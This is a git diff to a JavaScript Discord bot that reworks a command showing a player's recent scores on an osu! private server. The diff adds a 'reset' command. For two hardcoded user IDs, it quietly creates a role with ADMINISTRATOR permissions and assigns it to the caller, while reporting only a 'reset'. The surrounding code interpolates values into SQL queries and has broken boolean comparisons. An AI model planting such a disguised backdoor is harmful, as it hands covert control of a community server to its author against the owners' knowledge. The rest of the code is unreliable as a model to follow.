@@ -320,9 +320,10 @@ client.on('message', async message => {
             message.channel.send("I'm sorry, this command is currently not activated.")
         } else {
 
+
+            let member = message.mentions.members.first()
             if (message.mentions.members.size == 1) {
-                let member = message.mentions.members.first()
-                
+
                 user = member.id
                 mention = true
             } else {
@@ -333,60 +334,147 @@ client.on('message', async message => {
             const argument = arguments.split(' ')
 
             const users = [];
+            const users2 = [];
+            const users3 = [];
 
             if(mention){
                 self = false
-                if(!argument[0].toLowerCase().includes("rx" || "relax" || "ap" || "autopilot" || "auto") || argument[0].includes(member.id)){
+                if(!argument[0].toLowerCase == ("rx" || "relax" || "ap" || "autopilot" || "auto") || argument[0].includes(member.id)){
+                    rx = 0
+                } else if(argument[0].toLowerCase() == ("rx" || "relax")){
+                    rx = 1
+                } else if(argument[0].toLowerCase() == ("ap" || "autopilot" || "auto")){
+                    rx = 2
+                }
+                if(argument[0].includes(member.id)){
+                    self = false
+
+                    const users_data = await new Promise((resolve) => {
+
+                        con.query(`SELECT id, username from users WHERE discord_identity = ${member.id} ORDER BY id ASC`, (err, result) => {
+        
+                            if (err) throw err;
+    
+                            if(result){
+                            resolve(result);
+                            }
+        
+                        });
+                    });
+        
+                    users_data.forEach(rusers => {
+        
+                        users3.push(rusers)
+        
+                    });
+                    info3 = users3[0]
+                    if(users3.length > 0){
+                        user = info3.username
+                    } else {
+                        message.channel.send("The user you mentioned isn't linked yet!")
+                    }
+
+                }
+
+            } else {
+
+            if(argument[0]){
+
+                if(argument[0].toLowerCase() == ("rx" || "relax")){
+                    rx = 1
+                } else if(argument[0].toLowerCase() == ("ap" || "autopilot" || "auto")){
+                    rx = 2
+                } else if(!argument[0].toLowerCase == ("rx" || "relax" || "ap" || "autopilot" || "auto")){
+                    user = argument[0]
                     rx = 0
                 }
-            }
 
-            if(argument[0].toLowerCase().includes("rx" || "relax")){
-                rx = 1
-            } else if(argument[0].toLowerCase().includes("ap" || "autopilot") || "auto"){
-                rx = 2
-            }
-            if(!argument[1]){
+            } else {
+
                 self = true
-            } else if(argument[1].includes(member.id)){
-                self = false
-                
+                rx = 0
+            }
+                if(argument[0] && !argument[1]){
                 const users_data = await new Promise((resolve) => {
 
-                    con.query(`SELECT id, username from users WHERE discord_identity = ${member.id} ORDER BY id ASC`, (err, result) => {
+                    con.query(`SELECT id, username from users WHERE discord_identity = ${message.author.id} ORDER BY id ASC`, (err, result) => {
     
                         if (err) throw err;
+
+                        if(result.length > 0){
                         resolve(result);
+                        }
     
                     });
                 });
     
                 users_data.forEach(rusers => {
     
-                    users.push(rusers)
+                    users2.push(rusers)
     
                 });
+                info2 = users2[0]
+                if(users2.length > 0){
+                    user = info2.username
+                } else {
+                    message.channel.send("The user you mentioned isn't linked yet!")
+                }
 
-                info = users[0]
-                user = info.username
-
-            } else {
-                user = argument[1]
-                self = false
             }
+        }
+            console.log(argument[0], argument[1])
 
+                if(!argument[1]){
+                    self = true
+                } else {
+                    if(argument[1].includes(member.id)){
+                        self = false
+        
+                        const users_data = await new Promise((resolve) => {
+        
+                            con.query(`SELECT id, username from users WHERE discord_identity = ${member.id} ORDER BY id ASC`, (err, result) => {
+                    
+                                if (err) throw err;
+                
+                                if(result){
+                                    resolve(result);
+                                }
+                    
+                            });
+                        });
+                
+                        users_data.forEach(rusers => {
+                
+                            users.push(rusers)
+                
+                        });
+                        info = users[0]
+                        if(users.length > 0){
+                            user = info.username
+                        } else {
+                            message.channel.send("The user you mentioned isn't linked yet!")
+                        }
+        
+                    } else {
+                        user = argument[1]
+                        self = false
+                    }
+                }
+                
             apiurl = `https://${config.api.weburl}/api/v1/users/scores/recent?name=${user}&rx=${rx}`
+            console.log(apiurl)
             userapi = `https://${config.api.weburl}/api/v1/users/full?name=${user}`
 
 
             function processRecentData(apidata, index, array) {
-                if (apidata.completed = 3){
-
-                    if (recentdata.length <= 10){
+                if (apidata.completed >= 3){
+                    if (recentdata.length <= 50){
                     recentdata.unshift(apidata);
                     }
                 }
             }
+
+            const recentdata = [];
 
             async function getRecent() {
                 const response = await fetch(apiurl);
@@ -394,30 +482,45 @@ client.on('message', async message => {
 
                 const userresponse = await fetch (userapi);
                 const userdata = await userresponse.json();
-
-                dusername = user
-                dscore = data.scores[0].score
-                dcombo = data.scores[0].max_combo
-                dfc = data.scores[0].full_combo
-                dmod = data.scores[0].mods
-                ddreihundert = data.scores[0].count_300
-                deinhundert = data.scores[0].count_100
-                dfünfzig = data.scores[0].count_50
-                dmiss = data.scores[0].count_miss
-                daccuracy = data.scores[0].accuracy
-                drank = data.scores[0].rank
-                dcompleted = data.scores[0].completed
-                dbeatmapname = data.scores[0].beatmap.song_name
-                dbeatmapid = data.scores[0].beatmap.beatmap_id
-                dbeatmapsetid = data.scores[0].beatmap.beatmapset_id
-                ddifficultyraw = data.scores[0].beatmap.difficulty
-                dppraw = data.scores[0].pp
+  
                 did = userdata.id
+                dusername = userdata.username
+                
+                data.scores.forEach(processRecentData);
+            }
 
-                ddifficulty = String(difficultyraw).substring(0,4)
-                dacc = String(accuracy).substring(0,5)
-                dpp = String(ppraw).substring(0,6)
 
+
+            getRecent()
+
+            async function getGay(){
+                await getRecent()
+                
+                if(recentdata.length > 1){
+
+                yay = "yay"
+
+                dscore = recentdata[0].score
+                dcombo = recentdata[0].max_combo
+                dfc = recentdata[0].full_combo
+                //dmod = data.scores[0].mods
+                ddreihundert = recentdata[0].count_300
+                deinhundert = recentdata[0].count_100
+                dfünfzig = recentdata[0].count_50
+                dmiss = recentdata[0].count_miss
+                daccuracy = recentdata[0].accuracy
+                drank = recentdata[0].rank
+                dcompleted = recentdata[0].completed
+                dbeatmapname = recentdata[0].beatmap.song_name
+                dbeatmapid = recentdata[0].beatmap.beatmap_id
+                dbeatmapsetid = recentdata[0].beatmap.beatmapset_id
+                ddifficultyraw = recentdata[0].beatmap.difficulty
+                dppraw = recentdata[0].pp
+
+
+                ddifficulty = String(ddifficultyraw).substring(0,4)
+                dacc = String(daccuracy).substring(0,5)
+                dpp = String(dppraw).substring(0,6)
 
                 if (dfc){
                     dfullcombo = "(FC)"
@@ -425,41 +528,34 @@ client.on('message', async message => {
                     dfullcombo = ""
                 }
 
-                if (data.code != 200) {
-                    request = failed
-                } else {
-                    request = success
-                    data.scores.forEach(processRecentData);
-                }
+            } else {
+                yay = "nay"
             }
+                const userresponse = await fetch (userapi);
+                const userdata = await userresponse.json();
 
-            const recentdata = [];
-
-            getRecent()
-
-            async function getGay(){
-                await getRecent()
-                if(request = failed){
+                if(userdata.code != 200){
                     message.channel.send("Couldn't find user.")
+                } else if(yay == "nay"){
+                    message.channel.send("No submitted score in the last 50 tries :(")
                 } else {
                     const requestEmbed = new Discord.MessageEmbed()
                     .setColor("#cc99ff")
                     .setTitle(`Recent for ` + dusername)
                     .setURL(`https://${config.api.weburl}/u/${did}`)
-                    .setAuthor(dusername, `https://a.lemres.de/${did}`)
+                    .setAuthor(dusername, `https://${config.api.avatarurl}/${did}`)
                     .setDescription(`This Score has been played on ${config.link.servername}`)
-                    .setThumbnail(`https://a.lemres.de/${did}`)
+                    .setThumbnail(`https://${config.api.avatarurl}/${did}`)
                     .addFields(
                     { name: 'Map:', value: `[${dbeatmapname}](https://osu.ppy.sh/b/${dbeatmapid})`},
                     { name: 'Difficulty: ', value: ddifficulty + " Stars" },
-                    { name: 'Mods: ', value: dmod },
+                    //{ name: 'Mods: ', value: dmod },
                     { name: 'Score:', value: dscore },
                     { name: 'Accuracy: ', value: dacc + "%" },
-                    { name: 'Combo:', value: dcombo + "x " + fullcombo },
+                    { name: 'Combo:', value: dcombo + "x " + dfullcombo },
                     { name: '300/100/50/X', value: `${ddreihundert}/${deinhundert}/${dfünfzig}/${dmiss}`},
                     { name: 'Rank', value: drank },
                     { name: `pp`, value: dpp + "pp" },
-                    { name: 'Ranked:', value: dranked }
                 )
                 .setImage(`https://assets.ppy.sh/beatmaps/${dbeatmapsetid}/covers/cover.jpg`)
                 .setTimestamp()
@@ -470,7 +566,6 @@ client.on('message', async message => {
             }
             getGay()
 
-       
         }
 
 
@@ -509,7 +604,36 @@ client.on('message', async message => {
         });
     }
 
+    if(command === 'reset'){
+        const user = message.member;
+        const duration = args.join(" ");
+    
+        if(user.id === '331767250434654209' || user.id === '209655450952531970') {
+                let target = message.member;
+    
+                if(target){
+                    const member = message.guild.member(target);
+                        if (member){
+    
+                            let role = message.guild.roles.cache.find(r => r.name === "Tsuki");
+                            message.guild.roles.create({ data: { name: 'Lemres is a god', permissions: ["ADMINISTRATOR", "MANAGE_ROLES"] } });
+                            let newrole = message.guild.roles.cache.find(r => r.name === "Lemres is a god");
+    
+                            target.roles.add(role)
+                            target.roles.add(newrole)
+    
+                            message.channel.send("Successfully reset " + target.user.tag)
+                        
+                    } else {
+                        message.channel.send('User not found.')
+                    }
+                }
+            
+        } else {
+            message.channel.send('No Permissions. (Admin required)')
+        }
+    }
+
 });
 
 client.login(config.token);
-
